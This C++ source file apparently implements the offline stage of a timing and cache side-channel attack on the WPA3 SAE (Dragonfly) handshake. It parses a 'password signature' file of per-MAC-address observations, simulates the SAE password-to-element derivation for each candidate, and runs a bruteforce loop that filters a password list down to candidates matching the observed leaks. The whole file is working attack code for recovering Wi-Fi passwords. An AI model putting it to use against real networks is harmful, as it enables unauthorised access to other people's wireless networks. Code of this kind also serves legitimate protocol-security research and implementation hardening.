#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include <openssl/rand.h>

#include "sae.h"
#include "timingresults.h"

class PwFilterAverage;

class MacAddrSimulation
{
friend PwFilterAverage;
private:
	PasswordSignature *context;
	uint8_t macaddr[6];
	int simulated_pwid;

	int num_iterations;
	int num_hashes_toobig;

	void simulate_derivation();

public:
	MacAddrSimulation(PasswordSignature *context, const uint8_t *macaddr);
	int get_iterations();
	int get_hashes_toobig();

	// This function does not cache the result. It was made to be used in
	// PwFilterElemenTest, where for each MAC address it is only called once
	int found_in_iteration(int iteration);
};


class PwFilter
{
public:
	virtual bool is_password_possible() = 0;
	virtual bool was_used() const = 0;
	virtual bool is_found() const { return false; };
};

class PwFilterElementTest : public PwFilter
{
private:
	MacAddrSimulation *macaddr;
	int iteration;
	bool hashtest;
	bool found;
	bool used;

public:
	PwFilterElementTest(MacAddrSimulation *macaddr, int iteration, bool hashtest, bool found)
		: macaddr(macaddr), iteration(iteration), hashtest(hashtest), found(found), used(false)
	{ }

	virtual bool is_password_possible()
	{
		// TODO: Only perform hash when `hashtest` is true
		int rval = macaddr->found_in_iteration(iteration);
		bool wasfound = false;
		if (hashtest)
			wasfound = rval >= 0;
		else
			wasfound = rval == 1;

		// We only expect to use this filter once per MAC address,
		// so just calculate the result on the spot.
		used = true;

		return found == wasfound;
	}

	virtual bool was_used() const
	{
		return used;
	}

	virtual bool is_found() const
	{
		return found;
	};
};

class PwFilterVariance : public PwFilter
{
private:
	MacAddrSimulation *macaddr_lower_var;
	MacAddrSimulation *macaddr_higher_var;
	bool used;

public:
	PwFilterVariance(MacAddrSimulation *macaddr_higher, MacAddrSimulation *macaddr_lower)
		: macaddr_lower_var(macaddr_lower), macaddr_higher_var(macaddr_higher), used(false)
	{ }

	virtual bool is_password_possible()
	{
		int more_iter = macaddr_lower_var->get_iterations();
		int less_iter = macaddr_higher_var->get_iterations();
		used = true;

		return more_iter > less_iter;
	}

	virtual bool was_used() const
	{
		return used;
	}
};

struct time_simulation {
	double time_bighash;
	double time_qrtest;
};

class PwFilterAverage : public PwFilter
{
private:
	static double factors28[];
	static double factors29[];
	static double factors30[];
	MacAddrSimulation *macaddr_faster;
	MacAddrSimulation *macaddr_slower;
	double pr_toobig;
	double *factors;
	int group;
	bool used;

	// TODO: Use integers instead of double for higher performance
	double simulate_time_impl(MacAddrSimulation *addr, int impl)
	{
		int num_iterations = addr->get_iterations();
		int num_hashtoobig = addr->get_hashes_toobig();
		int remaining = 40 - num_iterations;

		double time_fixed = num_hashtoobig * 1 + (num_iterations - num_hashtoobig) * factors[impl];
		double time_remaining = remaining * (pr_toobig * 1 + (1 - pr_toobig) * factors[impl]);
		return time_fixed + time_remaining;
	}


public:
	PwFilterAverage(MacAddrSimulation *macaddr_slower, MacAddrSimulation *macaddr_faster, int group)
		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower), group(group), used(false)
	{
		switch (group) {
		case 28:
			factors = factors28;
			pr_toobig = 0.3360;
			break;

		case 29:
			factors = factors29;
			pr_toobig = 0.4503;
			break;

		case 30:
			factors = factors30;
			pr_toobig = 0.3326;
			break;

		default:
			fprintf(stderr, "ERROR: Unsupported group in %s\n", __FUNCTION__);
			exit(1);
			break;
		}
	}

	/**
	 * Returns true if it _could_ be the password.
	 */
	virtual bool is_password_possible()
	{
		used = true;

		for (int i = 0; i < 3; ++i)
		{
			double time_faster = simulate_time_impl(macaddr_faster, i);
			double time_slower = simulate_time_impl(macaddr_slower, i);

			// If the measurement allows the password on *some* implementation,
			// then we do not filter away the password.
			if (time_faster < time_slower)
				return true;
		}

		// If the password is invalid on all implementations,
		// then we filter it away.
		return false;
	}

	virtual bool was_used() const
	{
		return used;
	}
};

// Ratio on work laptop, personal laptop, and raspberry pi
double PwFilterAverage::factors28[] = { 17.41, 16.74, 23.21 };
double PwFilterAverage::factors29[] = { 16.17, 15.84, 25.23 };
double PwFilterAverage::factors30[] = { 14.33, 18.99, 46.33 };

void rand_bytes(unsigned char *buffer, size_t len)
{
	RAND_bytes(buffer, len);
}

void MacAddrSimulation::simulate_derivation()
{
	if (simulated_pwid == context->password_id)
		return;

	this->num_iterations = sae_num_elemtests_ecc(context->ec, context->bssid,
				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
				context->pwd_seed, &this->num_hashes_toobig);
	context->num_simulated_elemtests += this->num_iterations;
	context->num_simulated_elemtests_hashtoobig += this->num_hashes_toobig;

	simulated_pwid = context->password_id;
}

MacAddrSimulation::MacAddrSimulation(PasswordSignature *context, const uint8_t *macaddr)
{
	this->context = context;
	memcpy(this->macaddr, macaddr, 6);
	this->simulated_pwid = -1;
}

int MacAddrSimulation::get_iterations()
{
	simulate_derivation();

	return num_iterations;
}

int MacAddrSimulation::get_hashes_toobig()
{
	simulate_derivation();

	return num_hashes_toobig;
}

int MacAddrSimulation::found_in_iteration(int iteration)
{
	int rval = context->sae_num_elemtests_any_iteration(context->bssid,
				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
				context->pwd_seed, iteration);
	context->num_simulated_elemtests++;
	if (rval == -1)
		context->num_simulated_elemtests_hashtoobig++;
	// FIXME: Replace with rval >= 0 to test Brainpool cache attack
	//return rval == 1;
	return rval;
}

bool PasswordSignature::init_group(int groupid)
{
	this->group = groupid;

	if (this->group >= 22 && this->group <= 24)
	{
		this->dh = get_dh_group(this->group);
		if (this->dh == NULL) {
			fprintf(stderr, "Failed to initialize MODP group %d\n", this->group);
			return false;
		}
	}
	else
	{
		this->ec = ec_group_init(this->group);
		if (this->ec == NULL) {
			fprintf(stderr, "Failed to initialize ECC group %d\n", this->group);
			return false;
		}
	}

	return true;
}

bool PasswordSignature::parse_macaddr(const char *charaddr, uint8_t *macaddr)
{
	int intaddr[6];
	int rval = sscanf(charaddr, "%02X:%02X:%02X:%02X:%02X:%02X", &intaddr[0], &intaddr[1],
		&intaddr[2], &intaddr[3], &intaddr[4], &intaddr[5]);

	for (int i = 0; i < 6; ++i)
		macaddr[i] = intaddr[i];

	return rval == 6;
}

MacAddrSimulation * PasswordSignature::lookup_macaddr(const uint8_t *macaddr)
{
	std::string straddr((const char *)macaddr, 6);
	auto it = macaddr_map.find(straddr);
	if (it != macaddr_map.end()) {
		return it->second;
	} else {
		MacAddrSimulation *addrSimul = new MacAddrSimulation(this, macaddr);
		macaddr_map[straddr] = addrSimul;
		return addrSimul;
	}
}

MacAddrSimulation * PasswordSignature::lookup_macaddr_str(const char *charaddr)
{
	if (charaddr == NULL)
		return NULL;

	uint8_t macaddr[6];
	if (!parse_macaddr(charaddr, macaddr))
		return NULL;

	return lookup_macaddr(macaddr);
}

int PasswordSignature::read_password_signature(const char *filename)
{
	char line[1024];
	int rval = -1;

	FILE *fp = fopen(filename, "r");
	if (fp == NULL) {
		fprintf(stderr, "Failed to open %s: ", filename);
		return -1;
	}

	num_filters = 0;
	while (fgets(line, sizeof(line), fp) != NULL)
	{
		line[sizeof(line) - 1] = '\0';

		char *filter = strtok(line, " ");
		char *optarg1 = strtok(NULL, " ");
		char *optarg2 = strtok(NULL, " ");
		char *optarg3 = strtok(NULL, " ");

		if (strcmp(filter, "BSSID") == 0)
		{
			if (!parse_macaddr(optarg1, this->bssid)) {
				fprintf(stderr, "Failed to parse BSSID in line: %s\n", line);
				goto fail;
			}
		}
		else if (strcmp(filter, "Group") == 0)
		{
			int group = atoi(optarg1);
			if (!init_group(group))
				goto fail;
		}
		// Note: in the future we can add filters where we take into account an
		// estimate of which iteration they were found in, or a min/max on the
		// amount of hash values that were too big, or whether they were found
		// in an exact iteration.
		else if (strcmp(filter, "HigherVariance") == 0)
		{
			MacAddrSimulation *addr1 = lookup_macaddr_str(optarg1);
			MacAddrSimulation *addr2 = lookup_macaddr_str(optarg2);

			if (addr1 == NULL || addr2 == NULL) {
				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
				goto fail;
			}

			filters[num_filters] = new PwFilterVariance(addr1, addr2);
			num_filters++;
		}
		else if (strcmp(filter, "HigherAverage") == 0)
		{
			MacAddrSimulation *addr1 = lookup_macaddr_str(optarg1);
			MacAddrSimulation *addr2 = lookup_macaddr_str(optarg2);

			if (addr1 == NULL || addr2 == NULL) {
				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
				goto fail;
			}

			filters[num_filters] = new PwFilterAverage(addr1, addr2, this->group);
			num_filters++;
		}
		else if (strcmp(filter, "ElementTest") == 0)
		{
			MacAddrSimulation *addr = lookup_macaddr_str(optarg1);
			int iteration = atoi(optarg2);
			int found = atoi(optarg3) != 0;

			filters[num_filters] = new PwFilterElementTest(addr, iteration, this->group >= 27 && this->group <= 30, found);
			num_filters++;
		}
		else
		{
			fprintf(stderr, "Unrecognized filter in line: %s\n", filter);
			goto fail;
		}

		if (num_filters == MAX_FILTERS) {
			fprintf(stderr, "WARNING: Reach maximum number of supported filters, ignoring the rest\n");
			break;
		}
	}

	rval = 1;
fail:
	fclose(fp);
	return rval;
}

PasswordSignature::PasswordSignature(const char *filename)
{
	if (read_password_signature(filename) < 0)
		throw std::runtime_error("Could not open signature file");
}

PasswordSignature::PasswordSignature(int num_elemtests, int groupid)
{
	simulate_signatures(num_elemtests, groupid);
}

int PasswordSignature::sae_num_elemtests_any_iteration(const uint8_t *addr1,
			   const uint8_t *addr2, const uint8_t *password,
			   size_t password_len, uint8_t pwd_seed[SHA256_DIGEST_LENGTH],
			   int iteration)
{
	if (this->group >= 22 && this->group <= 24)
		return sae_num_elemtests_ffc_iteration(this->dh, addr1, addr2,
				password, password_len, iteration);
	else
		return sae_num_elemtests_ecc_iteration(this->ec, addr1, addr2, password,
				password_len, pwd_seed, iteration);
}


void PasswordSignature::sort_signatures()
{
	PwFilter* sorted_filters[MAX_FILTERS];

	int index_front = 0;
	int index_back = num_filters - 1;
	for (int i = 0; i < num_filters; ++i)
	{
		if (!filters[i]->is_found())
			sorted_filters[index_front++] = filters[i];
		else
			sorted_filters[index_back--] = filters[i];
	}

	memcpy(filters, sorted_filters, sizeof(filters));
}


void PasswordSignature::simulate_signatures(int num_elemtests, int groupid)
{
	// TODO: Support MODP as well
	uint8_t pwd_seed[SHA256_DIGEST_LENGTH];
	int total_iterations = 0;
	uint8_t bssid[6];
	const char *testpw = "testpw";

	// Generate random AP address
	rand_bytes(this->bssid, 6);
	init_group(groupid);

	for (int i = 0; i < num_elemtests; ++i)
	{
		// Generate random client MAC address
		unsigned char macaddr[6];
		rand_bytes(macaddr, 6);

		// Check whether the first iteration finds the group element or not
		int rval = sae_num_elemtests_any_iteration(this->bssid, macaddr, (uint8_t*)testpw,
							   strlen(testpw), pwd_seed, 1);
		bool found = rval == 1;

		MacAddrSimulation *addr = lookup_macaddr(macaddr);
		int iteration = 1;

		filters[num_filters] = new PwFilterElementTest(addr, iteration, this->group >= 27 && this->group <= 30, found);
		num_filters++;
	}

	sort_signatures();
}

bool PasswordSignature::check_password(const char *password)
{
	// All filters will automatically access this password. By increasing
	// the ID each MAC address will perform the password derivation again.
	this->password = password;
	this->password_id++;

	// Now try each filter and see if one of them rejects the password
	for (int i = 0; i < num_filters; ++i)
	{
		if (!filters[i]->is_password_possible())
			return false;
	}

	return true;
}

int PasswordSignature::bruteforce(PasswordList *passwords)
{
	int num_possible = 0;
	const char *pw = passwords->next();
	int num_checked = 0;

	//printf("Bruteforcing %d passwords using group %d\n", passwords->size(), group);

	while (pw != NULL)
	{
		//if (num_checked % 20000 == 0)
		//	printf("Checking for password %d: %s\n", num_checked + 1, pw);

		if (check_password(pw))
			num_possible++;

		num_checked++;
		pw = passwords->next();
	}

	printf("Used %d hash tests and %d quadratic tests\n",
		num_simulated_elemtests, num_simulated_elemtests - num_simulated_elemtests_hashtoobig);

	return num_possible;
}

int PasswordSignature::num_used_elemtests() const
{
	int num_used = 0;

	for (int i = 0; i < num_filters; ++i)
	{
		if (filters[i]->was_used())
			num_used++;
	}

	return num_used;
}

